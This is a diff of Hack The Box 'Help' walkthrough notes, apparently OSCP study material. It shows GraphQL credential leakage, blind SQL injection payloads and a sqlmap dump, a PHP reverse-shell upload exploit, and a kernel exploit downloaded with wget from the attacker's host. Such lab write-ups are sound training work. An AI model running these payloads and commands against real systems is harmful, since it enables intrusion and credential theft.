@@ -4,14 +4,14 @@
 	- tried to access some files in the root folder in github and found README.md which showed the version. so searched for it in URL to find out version.
 		README.md worked and it showed the version (help.htb/support/README.md) = 1.0.2
 - **NEWTOOL SEARCHSPLOIT**
-	```bash
+	```
 - searchsploit helpdeskz
 - searchsploit -x path/to/exploit : to examine
 searchsploit -m /path/to/exploit to copy exploit to working direcctory
 ```
 	- we find 2 exploit routes. (3 now)\
 - nmap shows 3 ports so we check the third one (3000):
-	```bash
+	```
 help.htb:3000
 ```
 	- we see a message :
@@ -24,20 +24,20 @@ help.htb:3000
 ## Method 1: Authenticated SQLi
 - search around to find graphql queiries
 	- username:
-		```bash
+		```
 	http://help.htb:3000/graphql?query=query{user{username}}
 ```
 		- helpme@helpme.com
 
 	- password:
-		```bash
+		```
 	http://help.htb:3000/graphql?query=query{user{password}}
 ```
 		- 5d3c93182bb20f07b994a7f617e99cff
 			 - its 32 characters so its an MD5 hash which can be cracked (to check, echo -n 'fdsfshfsio' | wc -c)
 				- godhelpmeplz
 - login to helpdeskz
-	```bash
+	```
 searchsploit helpdeskz shows authenticated sqli
 searchsploit -x /path/to/exploit
 searchsploit -m /path/to/exploit
@@ -50,7 +50,7 @@ searchsploit -m /path/to/exploit
 	tried to access some files in the root folder
 		README.md worked and it showed the version (help.htb/support/README.md) = 1.0.2
 - **NEWTOOL SEARCHSPLOT**
-	```bash
+	```
 searchsploit <name>
 searchsploit -x path/to/exploit : to examine
 searchsploit -m /path/to/exploit to copy exploit to working direcctory
@@ -59,7 +59,7 @@ searchsploit -m /path/to/exploit to copy exploit to working direcctory
 
 - **NOTE in burpsuite can select cookie and press Ctrl+Shift+U to URL Decode cookie**
 - login the helpdesk with above credentials, turn on burpsuite and try to catch one of the image attachments in burpsuite
-	![[OSCP~/Hack-The-Box/Attachments/Pasted image 20250322164709.png]]	- also right click image attachment and copy link address:
+	![OSCP~/Hack-The-Box/Attachments/Pasted image 20250322164709.png](OSCP~/Hack-The-Box/Attachments/Pasted%20image%2020250322164709.png)	- also right click image attachment and copy link address:
 		- http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=5&param[]=10
 	- test for sqli
 		- pass and 1=1 -- with the above url i.e:
@@ -70,14 +70,14 @@ searchsploit -m /path/to/exploit to copy exploit to working direcctory
 		- **in the helpdeskz github we see under controllers>staff>login_action.php that there is a table called staff with columns username and password. WE ALSO SEE IT USES SHA1 which is 40 characters long**
 		- to check admin:
 			- add this to url:
-				 ```bash
+				 ```
 and (select (username) from staff limit 0,1) = 'admin'-- -
 ```
 				- we get is true. although we can try other usernames to see how it acts when false
 			- now we try to find password and email:
 				- we use substr() function to loop character by character as we need to brute force the password with hex chracters [abcdef0123456789] such that when it does match it returns the character. this needs to be in a loop so we can get the full password of 40 characters (as its sha1)
 				- to try (this is not ideal as we dont know the first character but still) add this to url and it should return true i.e the attachment:
-					```bash
+					```
 and substr((select password from staff limit 0,1),1,1) = 'd'-- -
 ```
 				- So we need to make a script :
@@ -113,16 +113,16 @@ for i in range(0,41):
 		- ssh help@10.10.10.121
 			- enter password Welcome1
 - for email, adjust script (may not work, had to fix above code in python2
-	```bash
+	```
 chars = list(string.ascii_lowercase) + list(string.digits) + ['@', '_', '.']
 ```
 	- **NOTE :**
 		- used sqlmap (NOT ALLOWED IN OSCP)
-			```bash
+			```
 sqlmap -r sqlticket2 --batch --level 5 --risk 3 -p param[] -D support -T users --dump
 ```
 		- Main output **DOESNT FIND THE PWD WE ARE LOOKING FOR**:
-			```bash
+			```
 +----+-----------------------+----------+----------+------------------------------------------+------------------+------------+
 | id | email                 | status   | fullname | password                                 | timezone         | salutation |
 +----+-----------------------+----------+----------+------------------------------------------+------------------+------------+
@@ -144,13 +144,13 @@ sqlmap -r sqlticket2 --batch --level 5 --risk 3 -p param[] -D support -T users -
 		- in the github helpdeskz v1.0.2 repo we see an uploads folder and a tickets folder inside it.
 		- we check via the url if it returns any page and it redirects to help.htb so we know it exists.
 	- we save the exploit in our folder via
-		```bash
+		```
 searchsploit -m /path/to/exploit
 ```
 	- we then upload the file.
 		- we get a response file not found but it should be uploaded regardless
 	- we then pass our exploit command
-		```bash
+		```
 python2 exploit.py http://help.htb/support/uploads/tickets/ Reverseshell.php
 ```
 	- **Note: Earlier we find that it doesn't work. Checking the code we see it involved checking the time and our machine time needed to match with the server clock. This is what fixed the time**:
@@ -175,16 +175,16 @@ for x in range(0, 300):
 		- we find we are user help
 ## Privilege Escalation
 - then on enumeration we find
-	```bash
+	```
 uname -a
 ```
 	- gives us kernel version which we find is old and thus vulnerable.
 - we get the code from github and then start a server using python:
-	```bash
+	```
 python -m http.server 80
 ```
 - using this server, from user help we wget our exploit to that machine.
-	```bash
+	```
 wget 10.10.14.25/44298.c
 gcc 44298.c -o exploit
 chmod +x exploit
